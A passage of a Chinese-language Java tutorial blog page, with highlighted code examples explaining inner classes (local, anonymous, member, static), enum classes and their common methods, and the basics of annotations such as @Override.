class="keyword">interface</span> <span class="title class_">IG</span> <span class="keyword">extends</span> <span class="title class_">IH</span>&#123;&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Teacher</span> <span class="keyword">implements</span> <span class="title class_">IG</span> &#123;&#125;</span><br></pre></td></tr></table></figure><h1 id="内部类"><a class="markdownIt-Anchor" href="#内部类">#</a> 内部类</h1><p>一个类的内部又完整的嵌套类另一个类结构。被嵌套的类称为内部类 (inner class)，嵌套其他类的类称为外部类 (outer class)，是类的第五大成员 (属性、方法、构造器、代码块、内部类)，内部类最大的特点就是可以直接访问私有属性，并且可以体现类与类之间的包含关系。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Outer</span>&#123;<span class="comment">//外部类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Inner</span>&#123;<span class="comment">//内部类</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Other</span>&#123;&#125;<span class="comment">//其他类</span></span><br></pre></td></tr></table></figure><h2 id="内部类的分类"><a class="markdownIt-Anchor" href="#内部类的分类">#</a> 内部类的分类</h2><ul><li>定义在外部类局部位置上（比如方法内）：<ol><li>局部内部类（有类名）</li><li>匿名内部类（没有类名，重点）</li></ol></li><li>定义在外部类的成员位置上：<ol><li>成员内部类（没用 static 修饰）</li><li>静态内部类（使用 static 修饰）</li></ol></li></ul><h3 id="局部内部类的使用"><a class="markdownIt-Anchor" href="#局部内部类的使用">#</a> 局部内部类的使用</h3><p>局部内部类是定义在外部类的局部位置，比如方法中，并且有类名</p><ol><li><p>局部内部类可以<strong>直接访问</strong>外部类的<strong>所有成员</strong>，包括私有成员</p></li><li><p>不能添加访问修饰符，因为他的低位就是应该局部变量，局部变量是不能使用修饰符的，但是可以使用 final 修饰，因为局部变量也可以使用 final</p></li><li><p>作用域：只在定义它的方法或代码中</p></li><li><p>局部内部类访问外部类的成员，可以直接访问</p></li><li><p>外部类访问局部类的成员，需要<strong>创建对象再访问</strong></p></li><li><p>外部<strong>其他类</strong>不能访问局部内部类，因为局部内部类地位是一个局部变量</p></li><li><p>如果外部类和局部内部类的成员重名时，默认遵循就近原则，如果想访问外部类的成员，则可以使用（外部类名.this. 成员）去访问</p><ul><li><figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"外部类的n="</span> <span class="token operator">+</span> 外部类名<span class="token punctuation">.</span><span class="token keyword">this</span><span class="token punctuation">.</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>code￼<span class="token number">59</span><span class="token operator">--</span><span class="token operator">></span></pre></td></tr></table></figure></li></ul></li></ol><p>匿名内部类是系统自动生成的，表面上以一个对象的形式存在，但实际上底层生成了一个类，比如外部类叫做 Outer，那么匿名内部类会叫做 Outer$1，如果后面还有匿名内部类就依次按顺序排号</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Outer</span> &#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Person</span>()&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hi</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hi&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hi</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hi~~~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实际上他的形式在底层是这样的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Outer$1</span> <span class="keyword">extends</span> <span class="title class_">Person</span> &#123;&#125;</span><br></pre></td></tr></table></figure><h4 id="细节-8"><a class="markdownIt-Anchor" href="#细节-8">#</a> 细节</h4><ul><li>匿名内部类的语法比较奇特，因为匿名内部类既是一个类的定义，同时本身也是一个对象，因此从语法上看，它既有定义类的特征也有创建对象的特征。所以可以直接调用匿名内部类方法</li></ul><p>如何调用呢，以上面的为例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Outer</span> &#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Person</span>()&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hi</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hi&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;.ok();<span class="comment">//可以直接在后面跟着调用，输出hi</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hi</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hi~~~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Outer</span> &#123;</span><br><span class="line">    <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>()&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hi</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hi&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">    p.hi();<span class="comment">//动态绑定，运行类型是Outer$1，所以输出的是hi而不是hi~~~</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hi</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hi~~~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>可以直接访问外部类的所有成员，包含私有的</li><li>不能添加访问修饰符，因为它的地位是一个局部变量</li><li>作用域：仅仅在定义它的方法或代码块中</li><li>匿名内部类访问外部类成员，直接访问</li><li>外部<strong>其他类</strong>不能访问匿名内部类，因为匿名内部类相当于一个局部变量</li><li>如果外部类和内部类的成员重名，在内部类访问时，遵循就近原则，如果想访问外部类的成员，可以使用（外部类名.this. 成员）去访问</li></ul><h4 id="实例-2"><a class="markdownIt-Anchor" href="#实例-2">#</a> 实例</h4><p>当作实参直接传递</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Grass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//当作实参直接传递</span></span><br><span class="line">        f1(<span class="keyword">new</span> <span class="title class_">IL</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;hi&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//静态方法，形参是接口类型</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">f1</span><span class="params">(IL il)</span> &#123;</span><br><span class="line">        il.show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//接口</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">IL</span>&#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对比一下传统的方法（硬编码），如果说要多次使用，可以就用传统方法，但如果只用一次，直接传递会更简洁高效</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Grass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//在这调用</span></span><br><span class="line">f1(<span class="keyword">new</span> <span class="title class_">Picture</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//静态方法，形参是接口类型</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">f1</span><span class="params">(IL il)</span> &#123;</span><br><span class="line">        il.show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//接口</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">IL</span>&#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Picture</span> <span class="keyword">implements</span> <span class="title class_">IL</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;picture&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有一个铃声接口 Bell，里面有一个 ring 方法；有一个手机类 Cellphone，具有闹钟功能 alarmclock，参数是 Bell 类型；测试手机类的闹钟功能，通过匿名内部类作为参数，输出 &quot;起床啦&quot;；再传入一个匿名内部类对象，输出 &quot;get up!&quot;</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Grass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="type">Cellphone</span> <span class="variable">cellphone</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cellphone</span>();</span><br><span class="line">        cellphone.alarmclock(<span class="keyword">new</span> <span class="title class_">Bell</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">ring</span><span class="params">()</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;起床啦&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        cellphone.alarmclock(<span class="keyword">new</span> <span class="title class_">Bell</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">ring</span><span class="params">()</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;get up!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Cellphone</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">alarmclock</span><span class="params">(Bell bell)</span> &#123;</span><br><span class="line">        bell.ring();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Bell</span>&#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">ring</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="成员内部类的使用"><a class="markdownIt-Anchor" href="#成员内部类的使用">#</a> 成员内部类的使用</h3><p>成员内部类是定义在外部类的成员位置，并没有 static 修饰</p><ol><li><p>可以直接访问外部类的所有成员，包括私有的</p></li><li><p>可以添加任意访问修饰符（public、protected、默认、private），因为它本身也是一个成员</p></li><li><p>作用域和外部类的其他成员一样为整个类体，在外部类的成员方法中创建成员内部类对象，再调用方法</p></li><li><p>成员内部类访问外部类，直接访问</p></li><li><p>外部类访问成员内部类，创建对象再访问</p></li><li><p>外部其他类访问成员内部类</p><ol><li><figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// 第一种方式，相当于把 new Inner () 当作是 Outer 的成员</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token class-name">Outer<span class="token punctuation">.</span>Inner</span> inner <span class="token operator">=</span> <span class="token class-name">Outer</span><span class="token punctuation">.</span><span class="token keyword">new</span> <span class="token class-name">Inner</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>code￼<span class="token number">67</span><span class="token operator">--</span><span class="token operator">></span></pre></td></tr></table></figure></li><li><figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// 第三种其实本质上就是前两种的结合</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">new</span> <span class="token class-name">Outer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">new</span> <span class="token class-name">Inner</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>code￼<span class="token number">68</span><span class="token operator">--</span><span class="token operator">></span></pre></td></tr></table></figure></li></ol></li><li><p>可以直接访问外部类的所有静态成员，包含私有的，但不能直接访问非静态成员</p></li><li><p>可以添加任意访问修饰符（public、protected、默认、private），因为它的地位就是一个成员</p></li><li><p>作用域：同其他的成员，为整个类体</p></li><li><p>静态内部类访问外部类，可以直接访问所有静态成员</p></li><li><p>外部类访问静态内部类，创建对象再访问</p></li><li><p>外部其他类访问静态内部类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Outer.<span class="type">Inner</span> <span class="variable">inner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Outer</span>.Inner();</span><br></pre></td></tr></table></figure></li><li><p>如果外部类和内部类的成员重名，在内部类访问时，遵循就近原则，如果想访问外部类的成员，可以使用（外部类名。成员）去访问</p></li></ol><h1 id="枚举类"><a class="markdownIt-Anchor" href="#枚举类">#</a> 枚举类</h1><p>枚举是一组常量的集合，属于一种特殊的类，里面只包含一组有限的特定的对象</p><ol><li>不需要提供 setXxx 方法，因为枚举对象值通常为只读</li><li>对枚举对象 / 属性使用 final+static 共同修饰，实现底层优化</li><li>枚举对象名通常使用全部大写，常量的命名规范</li><li>枚举对象根据需要，也可以有多个属性</li></ol><h2 id="实例-3"><a class="markdownIt-Anchor" href="#实例-3">#</a> 实例</h2><ol><li><p>用自定义类来实现枚举</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Grass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(Season.SPRING);</span><br><span class="line">        System.out.println(Season.SUMMER);</span><br><span class="line">        System.out.println(Season.AUTUMN);</span><br><span class="line">        System.out.println(Season.WINTER);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Season</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String desc;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Season</span> <span class="variable">SPRING</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Season</span>(<span class="string">&quot;春天&quot;</span>, <span class="string">&quot;温暖&quot;</span>);</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Season</span> <span class="variable">SUMMER</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Season</span>(<span class="string">&quot;夏天&quot;</span>, <span class="string">&quot;炎热&quot;</span>);</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Season</span> <span class="variable">AUTUMN</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Season</span>(<span class="string">&quot;秋天&quot;</span>, <span class="string">&quot;凉爽&quot;</span>);</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Season</span> <span class="variable">WINTER</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Season</span>(<span class="string">&quot;冬天&quot;</span>, <span class="string">&quot;寒冷&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Season</span><span class="params">(String name, String desc)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.desc = desc;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getDesc</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> desc;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Season&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, desc=&#x27;&quot;</span> + desc + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>使用 enum 关键字实现枚举</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Grass2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(Season.SPRING);</span><br><span class="line">        System.out.println(Season.SUMMER);</span><br><span class="line">        System.out.println(Season.AUTUMN);</span><br><span class="line">        System.out.println(Season.WINTER);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">Season2</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//使用关键字enum代替class</span></span><br><span class="line">    <span class="comment">//如果有多个常量(对象)，用逗号间隔</span></span><br><span class="line">    <span class="comment">//格式：常量名(实参列表)</span></span><br><span class="line">    <span class="comment">//如果使用enum来实现枚举，要求将定义常量对象写在最前面</span></span><br><span class="line">    SPRING(<span class="string">&quot;春天&quot;</span>, <span class="string">&quot;温暖&quot;</span>),SUMMER(<span class="string">&quot;夏天&quot;</span>, <span class="string">&quot;炎热&quot;</span>),</span><br><span class="line">    AUTUMN(<span class="string">&quot;秋天&quot;</span>, <span class="string">&quot;凉爽&quot;</span>),WINTER(<span class="string">&quot;冬天&quot;</span>, <span class="string">&quot;寒冷&quot;</span>),WHAT;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String desc;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> Season2&#123;&#125;<span class="comment">//无参构造器，上面的WHAT因为没有传入参数所以是调用的无参构造器</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Season2</span><span class="params">(String name, String desc)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.desc = desc;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getDesc</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> desc;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Season&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, desc=&#x27;&quot;</span> + desc + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="细节-9"><a class="markdownIt-Anchor" href="#细节-9">#</a> 细节</h2><ol><li>当使用 enum 关键字开发一个枚举类时，默认会继承 Enum 类，且是一个 final 类（可以通过反编译看到）</li><li>传统的 public static final Season SPRING = new Season (“春天”, “温暖”); 简化成 SPRING (“春天”, “温暖”)，这里必须知道它调用的时哪个构造器</li><li>如果使用无参构造器创建枚举对象，则实参列表和小括号都可以省略</li><li>当有多个枚举对象时，使用逗号间隔，分号结尾</li><li>枚举对象必须放在枚举类的行首</li></ol><h2 id="enum常用方法"><a class="markdownIt-Anchor" href="#enum常用方法">#</a> enum 常用方法</h2><p>因为 enum 会默认继承 Enum 类，在父类中有些方法可以用</p><ol><li>toString：Enum 类已经重写过了，返回的是当前对象的属性信息</li><li>name：返回当前对象名（常量名），子类中不能重写</li><li>ordinal：返回当前对象的位置号，默认从 0 开始</li><li>values：返回当前枚举类中所有的常量</li><li>valueOf：将字符串转换成枚举对象，要求字符串必须为已有的常量名，否则报异常</li><li>compareTo：比较两个枚举常量，比较的就是位置号。（位置编号相减得 0 为真）</li></ol><h2 id="enum实现接口"><a class="markdownIt-Anchor" href="#enum实现接口">#</a> enum 实现接口</h2><ol><li><p>使用 enum 关键字后，不能再继承其他类，因为 enum 类会隐式继承 Enum，而 java 是单继承机制</p></li><li><p>枚举类和普通类一样，可以实现接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> 类名 implements 接口<span class="number">1</span>, 接口<span class="number">2</span>&#123;&#125;</span><br></pre></td></tr></table></figure></li></ol><h1 id="注解"><a class="markdownIt-Anchor" href="#注解">#</a> 注解</h1><ol><li>注解（Annotation）也被称为元数据（Metadata），用于修饰包、类、方法、属性、构造器、局部变量等数据信息</li><li>和注释一样，注解不影响程序逻辑，但注解可以被编译或运行，相当于嵌入在代码中的补充信息</li><li>再 javase 中，注解的使用目的比较简单，例如标记过时的功能，忽略警告等。在 javaEE 中注解占据了更重要的角色，例如用来配置应用程序的任何切面，代替 java EE 旧版中所遗留的繁冗代码和 XML 配置等。</li></ol><p>使用 Annotation 时要在其前面加 @符号，并把该 Annotation 当成一个修饰符使用，用于修饰它支持的程序元素</p><p>三个基本的 Annotation：</p><ol><li>@Override：限定某个方法，是重写父类方法，该注解只能用于方法</li><li>@Deprecated：用于表示某个程序元素（类、方法等）已过时</li><li>@SuppressWarnings：抑制编译器的警告</li></ol><h2 id="override"><a class="markdownIt-Anchor" href="#override">#</a> @Override</h2><ol><li>@Override 只能修饰方法，不能修饰其他类、包、属性等</li><li>@Target 是修饰注解的注解，称为元注解</li><li>查看 @Override 注解的源码为 @Target (ElementType.METHOD)，说明只能修饰方法</li></ol><figure class="highlight java"><table><tr><td 